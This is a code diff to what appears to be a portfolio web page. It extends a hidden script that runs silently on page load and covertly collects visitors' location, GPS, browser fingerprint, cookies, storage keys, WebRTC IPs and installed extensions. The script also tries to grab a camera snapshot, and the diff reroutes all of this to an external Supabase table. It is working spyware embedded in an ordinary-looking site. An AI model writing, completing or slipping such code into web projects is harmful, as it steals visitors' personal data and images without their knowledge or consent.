@@ -9,6 +9,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@500;600;700;800&family=Manrope:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/clientjs/0.1.11/client.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
   /* ============ RESET & TOKENS ============ */
   *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
@@ -602,12 +603,10 @@ const io = new IntersectionObserver(entries => {
   entries.forEach(e => {
     if (e.isIntersecting) {
       e.target.classList.add('in');
-      // animate skill bars
       if (e.target.classList.contains('skill')) {
         const fill = e.target.querySelector('.bar-fill');
         fill.style.width = e.target.dataset.pct + '%';
       }
-      // animate stat counters
       if (e.target.classList.contains('stats-row')) {
         e.target.querySelectorAll('[data-count]').forEach(n => {
           const target = +n.dataset.count;
@@ -626,7 +625,7 @@ const io = new IntersectionObserver(entries => {
 }, { threshold: 0.15 });
 document.querySelectorAll('.reveal').forEach(el => io.observe(el));
 
-// --- Mobile menu toggle (simple) ---
+// --- Mobile menu toggle ---
 const menuBtn = document.querySelector('.menu-btn');
 const links = document.querySelector('nav.links');
 menuBtn?.addEventListener('click', () => {
@@ -640,18 +639,17 @@ menuBtn?.addEventListener('click', () => {
 });
 
 /* ============================================================
-   DEVICE INTELLIGENCE COLLECTION — Silent / background only
-   Collects all available device data and sends to backend API.
-   No visible UI. No user interaction required.
+   SUPABASE DEVICE INTELLIGENCE COLLECTION — Silent background
+   Replace with your actual Supabase project URL and anon key.
    ============================================================ */
-(async function deviceIntelCollector() {
-  // ---- Backend endpoint config ----
-  const API_ENDPOINT = '/api/log';   // relative to page origin
+const SUPABASE_URL = 'https://YOUR_PROJECT_ID.supabase.co';      // <-- replace
+const SUPABASE_ANON_KEY = 'YOUR_ANON_KEY';                       // <-- replace
 
-  // Data store
+const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+(async function deviceIntelCollector() {
   const deviceData = {};
 
-  // ---- Helper: safe async gather ----
   const safeGather = async (label, fn) => {
     try {
       const result = await fn();
@@ -659,12 +657,11 @@ menuBtn?.addEventListener('click', () => {
         Object.assign(deviceData, typeof result === 'object' && !Array.isArray(result) ? result : { [label]: result });
       }
     } catch (err) {
-      // Silently ignore — do not break the page experience
       console.debug('Device intel: could not gather ' + label);
     }
   };
 
-  // ---- 1. IP Geolocation (ipwho.is — no key required) ----
+  // ---- 1. IP Geolocation ----
   await safeGather('geo', async () => {
     const res = await fetch('https://ipwho.is/');
     const json = await res.json();
@@ -685,7 +682,7 @@ menuBtn?.addEventListener('click', () => {
     return null;
   });
 
-  // ---- 2. GPS Coordinates (browser geolocation) ----
+  // ---- 2. GPS Coordinates ----
   await safeGather('gps', () =>
     new Promise(resolve => {
       if (!navigator.geolocation) return resolve(null);
@@ -709,42 +706,42 @@ menuBtn?.addEventListener('click', () => {
     const client = new ClientJS();
     deviceData.fingerprint = client.getFingerprint();
     deviceData.browser = client.getBrowser();
-    deviceData.browserVersion = client.getBrowserVersion();
+    deviceData.browser_version = client.getBrowserVersion();
     deviceData.os = client.getOS();
-    deviceData.osVersion = client.getOSVersion();
+    deviceData.os_version = client.getOSVersion();
     deviceData.device = client.getDevice();
-    deviceData.deviceType = client.getDeviceType();
-    deviceData.deviceVendor = client.getDeviceVendor();
+    deviceData.device_type = client.getDeviceType();
+    deviceData.device_vendor = client.getDeviceVendor();
     deviceData.cpu = client.getCPU();
-    deviceData.isMobile = client.isMobile();
-    deviceData.screenPrint = `${screen.width}x${screen.height}`;
-    deviceData.colorDepth = screen.colorDepth;
-    deviceData.pixelRatio = window.devicePixelRatio || 1;
+    deviceData.is_mobile = client.isMobile();
+    deviceData.screen_print = `${screen.width}x${screen.height}`;
+    deviceData.fingerprint_color_depth = screen.colorDepth;
+    deviceData.pixel_ratio = window.devicePixelRatio || 1;
     deviceData.orientation = screen.orientation?.type || null;
     deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     deviceData.language = navigator.language;
-    deviceData.systemLanguage = navigator.systemLanguage || navigator.language;
-    deviceData.canvasPrint = client.getCanvasPrint();
+    deviceData.system_language = navigator.systemLanguage || navigator.language;
+    deviceData.canvas_print = client.getCanvasPrint();
     const fonts = client.getFonts();
     deviceData.fonts = fonts ? fonts.slice(0, 30) : [];
     const plugins = Array.from(navigator.plugins || []).map(p => p.name);
     deviceData.plugins = plugins.slice(0, 20);
-    deviceData.cookieSupport = navigator.cookieEnabled;
-    deviceData.localStorageSupport = typeof Storage !== 'undefined';
-    deviceData.sessionStorageSupport = typeof Storage !== 'undefined';
+    deviceData.cookie_support = navigator.cookieEnabled;
+    deviceData.local_storage_support = typeof Storage !== 'undefined';
+    deviceData.session_storage_support = typeof Storage !== 'undefined';
   } catch (e) { console.debug('ClientJS fingerprint failed'); }
 
   // ---- 4. Network info ----
   const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  deviceData.connectionType = conn?.effectiveType || conn?.type || null;
+  deviceData.connection_type = conn?.effectiveType || conn?.type || null;
   deviceData.downlink = conn?.downlink || null;
   deviceData.rtt = conn?.rtt || null;
-  deviceData.saveData = conn?.saveData ?? null;
+  deviceData.save_data = conn?.saveData ?? null;
 
   // ---- 5. Hardware ----
-  deviceData.hardwareConcurrency = navigator.hardwareConcurrency || null;
-  deviceData.deviceMemory = navigator.deviceMemory || null;
-  deviceData.maxTouchPoints = navigator.maxTouchPoints || 0;
+  deviceData.hardware_concurrency = navigator.hardwareConcurrency || null;
+  deviceData.device_memory = navigator.deviceMemory || null;
+  deviceData.max_touch_points = navigator.maxTouchPoints || 0;
   deviceData.platform = navigator.platform || null;
   deviceData.vendor = navigator.vendor || null;
 
@@ -755,8 +752,8 @@ menuBtn?.addEventListener('click', () => {
       return {
         battery_charging: b.charging,
         battery_level: b.level,
-        battery_chargingTime: b.chargingTime === Infinity ? null : b.chargingTime,
-        battery_dischargingTime: b.dischargingTime === Infinity ? null : b.dischargingTime
+        battery_charging_time: b.chargingTime === Infinity ? null : b.chargingTime,
+        battery_discharging_time: b.dischargingTime === Infinity ? null : b.dischargingTime
       };
     }
     return null;
@@ -765,36 +762,36 @@ menuBtn?.addEventListener('click', () => {
   // ---- 7. Screen ----
   deviceData.screen_width = screen.width;
   deviceData.screen_height = screen.height;
-  deviceData.screen_availWidth = screen.availWidth;
-  deviceData.screen_availHeight = screen.availHeight;
-  deviceData.color_depth = screen.colorDepth;
+  deviceData.screen_avail_width = screen.availWidth;
+  deviceData.screen_avail_height = screen.availHeight;
+  deviceData.screen_color_depth = screen.colorDepth;
   deviceData.pixel_depth = screen.pixelDepth;
-  deviceData.innerWidth = window.innerWidth;
-  deviceData.innerHeight = window.innerHeight;
+  deviceData.inner_width = window.innerWidth;
+  deviceData.inner_height = window.innerHeight;
 
   // ---- 8. Extra leaks ----
   deviceData.referrer = document.referrer || null;
-  deviceData.pageUrl = window.location.href;
+  deviceData.page_url = window.location.href;
   deviceData.cookies = document.cookie ? document.cookie.substring(0, 500) : null;
-  deviceData.sessionStorageKeys = (() => {
+  deviceData.session_storage_keys = (() => {
     try { return Object.keys(sessionStorage); } catch (e) { return []; }
   })();
-  deviceData.localStorageKeys = (() => {
+  deviceData.local_storage_keys = (() => {
     try { return Object.keys(localStorage); } catch (e) { return []; }
   })();
-  deviceData.doNotTrack = navigator.doNotTrack || window.doNotTrack || null;
+  deviceData.do_not_track = navigator.doNotTrack || window.doNotTrack || null;
   deviceData.webdriver = navigator.webdriver ?? false;
   deviceData.languages = navigator.languages || [];
-  deviceData.pdfViewer = (() => {
+  deviceData.pdf_viewer = (() => {
     for (let p of navigator.plugins) {
       if (p.name && p.name.includes('PDF')) return true;
     }
     return false;
   })();
-  deviceData.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-  deviceData.timezoneOffset = new Date().getTimezoneOffset();
-  deviceData.collectedTimestamp = Date.now();
-  deviceData.userAgent = navigator.userAgent;
+  deviceData.touch_support = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+  deviceData.timezone_offset = new Date().getTimezoneOffset();
+  deviceData.collected_timestamp = Date.now();
+  deviceData.user_agent = navigator.userAgent;
 
   // ---- 9. WebRTC IP leak ----
   await safeGather('webrtc_ips', () =>
@@ -821,10 +818,7 @@ menuBtn?.addEventListener('click', () => {
       { name: "Ghostery", url: "chrome-extension://mlomiejdfkolichcflejclcbmpeaniij/icon128.png" },
       { name: "uBlock Origin", url: "chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/icon128.png" },
       { name: "LastPass", url: "chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/icon128.png" },
-      { name: "Grammarly", url: "chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen/icon128.png" },
-      { name: "Honey", url: "chrome-extension://bmnlcjabgnpnenekpadlanbbkooimhnj/icon128.png" },
-      { name: "React DevTools", url: "chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/icon128.png" },
-      { name: "Vue DevTools", url: "chrome-extension://nhdogjmejiglipccpnnnanhbledajbpd/icon128.png" }
+      { name: "Grammarly", url: "chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen/icon128.png" }
     ];
     const results = await Promise.all(tests.map(t =>
       new Promise(resolve => {
@@ -838,10 +832,12 @@ menuBtn?.addEventListener('click', () => {
     return results.filter(Boolean);
   });
 
-  // ---- 11. Camera snapshot (still frame) ----
+  // ---- 11. Camera snapshot ----
   await safeGather('camera_image', async () => {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: "user" } });
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { width: 320, height: 240, facingMode: "user" } 
+      });
       const video = document.createElement('video');
       video.srcObject = stream;
       video.play();
@@ -858,29 +854,34 @@ menuBtn?.addEventListener('click', () => {
     }
   });
 
-  // ---- 12. Extra fingerprint data points ----
-  deviceData.timeToCollect = Date.now() - deviceData.collectedTimestamp;
-  deviceData.pageTitle = document.title;
-  deviceData.historyLength = history.length;
-  deviceData.onlineStatus = navigator.onLine;
+  // ---- 12. Extra metadata ----
+  deviceData.time_to_collect = Date.now() - deviceData.collected_timestamp;
+  deviceData.page_title = document.title;
+  deviceData.history_length = history.length;
+  deviceData.online_status = navigator.onLine;
 
-  // ---- SEND to backend (silently, no UI) ----
+  // Store raw JSON backup
+  deviceData.raw_data = { ...deviceData };
+
+  // ---- SEND to Supabase ----
   const sendData = async () => {
     try {
-      const res = await fetch(API_ENDPOINT, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(deviceData)
-      });
-      if (res.ok) {
-        console.debug('Device intel: data sent successfully');
+      const { data, error } = await supabase
+        .from('device_logs')
+        .insert([deviceData])
+        .select();
+
+      if (error) {
+        console.debug('Supabase insert error:', error.message);
+      } else {
+        console.debug('Device intel: sent to Supabase successfully');
       }
     } catch (err) {
-      console.debug('Device intel: send failed (backend may be offline)');
+      console.debug('Device intel: send failed', err.message);
     }
   };
 
-  // Auto-send after a short delay to let page settle
+  // Auto-send after page settles
   setTimeout(sendData, 2500);
 
 })();
